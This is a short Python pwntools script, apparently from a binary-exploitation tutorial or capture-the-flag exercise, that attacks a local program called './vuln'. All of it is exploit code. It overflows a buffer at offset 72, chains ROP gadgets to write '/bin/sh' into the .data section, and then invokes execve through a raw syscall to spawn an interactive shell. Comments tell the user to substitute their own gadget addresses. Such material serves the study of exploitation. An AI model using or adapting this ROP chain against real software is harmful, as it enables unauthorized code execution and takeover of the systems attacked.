from pwn import *

elf = context.binary = ELF('./vuln')
p = elf.process()

offset = 72  # From Step 2

# Gadgets (replace with yours)
pop_rdi = 0x401c80 #replace with the address of your pop rdi; ret
pop_rsi = 0x404d66 #replace with the address of your pop rsi; ret
pop_rdx_rbx = 0x462fe7 #replace with the address of your pop rdx; pop rbx; ret
pop_rax = 0x4306f7 #replace with the address of your pop rax; ret
syscall = 0x4011a2 #replace with the address of your syscall
data_section = 0x4a40c0 #replace with the address of your .data section

# Step 1: Write "/bin/sh" to .data
rop_write = flat(
    pop_rdi, 0,             # stdin (fd=0)
    pop_rsi, data_section,  # dest = .data
    pop_rdx_rbx, 8, # len("/bin/sh\x00")
    0xdeadbeef,
    elf.sym['read'],        # read(0, .data, 8)
)

# Step 2: Call execve("/bin/sh", 0, 0)
rop_exec = flat(
    pop_rdi, data_section,  # arg1 = "/bin/sh"
    pop_rsi, 0,       # arg2 = NULL
    pop_rdx_rbx,      # Gadget: pop rdx; pop rbx; ret
    0,                # Value for rdx (NULL)
    0xdeadbeef,       # Dummy value for rbx (can be anything)
    pop_rax, 59,      # syscall number
    syscall
)

payload = b'A' * offset + rop_write + rop_exec
p.sendline(payload)
p.sendline(b"/bin/sh\x00")  # Send the string
p.interactive()  # Enjoy your shell!
